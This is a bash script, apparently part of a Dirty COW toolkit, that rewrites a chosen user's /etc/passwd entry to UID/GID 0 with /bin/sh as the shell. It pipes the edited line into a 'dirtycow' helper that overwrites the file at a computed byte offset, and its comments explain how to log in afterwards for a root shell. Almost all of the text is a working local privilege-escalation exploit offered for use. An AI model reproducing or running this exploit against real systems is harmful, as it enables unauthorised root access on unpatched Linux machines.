#!/bin/bash
#
# Edit /etc/passwd to give user(s) root privileges and default shell /bin/sh.
#
# If arguments are passed, they are taken as users to escalate. Otherwise, $USER
# is assumed instead.
#
# This will likely make the X session unstable if used on the current user.
# By editing the user's UID in /etc/passwd, many things that check the user's
# UID (e.g., sudo) will fail. Because of this, the unmodified version of
# /etc/passwd is backed up to $HOME before performing the exploit.
#
# After running this script, switch to a TTY and log in as the user(s)
# to gain a root shell.

. "$(dirname "$0")/common.sh"

backup /etc/passwd "$HOME/passwd"

escalate_user() {
	local user="$1"

	if ! grep "^$user" /etc/passwd >/dev/null 2>&1; then
		echoerr "User $user not found in /etc/passwd"
		return 1
	fi

	# calculate the byte offset of ${user}'s line in /etc/passwd
	local offset="$(grep --byte-offset "^$user" /etc/passwd | cut --delimiter=':' --fields=1)"

	# awk script outputs ${user}'s line in /etc/passwd, but modified to have a
    # UID/GID of 0 (effectively aliasing the account to the root user) and a
    # default shell of /bin/sh (to work around any potential nologin issues)
	awk -v FS=':' -v user="$user" '
			BEGIN {
				# important constants for script
				root_uid = 0
				new_shell = "/bin/sh"

				# indices of important fields in /etc/passwd
				i_uid = 3
				i_gid = 4
				i_comment = 5
				i_shell = 7
			}

			$0 ~ "^"user {
				# calculate padding needed in comment field
				padding += length($i_uid) - length(root_uid)
				padding += length($i_gid) - length(root_uid)

				shell_diff = length($i_shell) - length(new_shell)
				padding += shell_diff > 0 ? shell_diff : 0

				# edit record with root (G)UID, /bin/sh as shell
				for (i = 1; i <= NF; ++i) {
					if (i == i_uid || i == i_gid) {
						printf root_uid
					} else if (i == i_comment) {
						# pad comment to line up with old end of comment
						printf $i
						for (n = 0; n < padding; ++n) printf " "
					} else if (i == i_shell) {
						printf new_shell
					} else {
						printf $i
					}

					if (i != NF) printf FS
				}
			}' /etc/passwd \
		| dirtycow -o "$offset" /etc/passwd
}

if [ $# -eq 0 ]; then
	escalate_user "$USER"
else
	for user in $@; do
		escalate_user "$user"
	done
fi
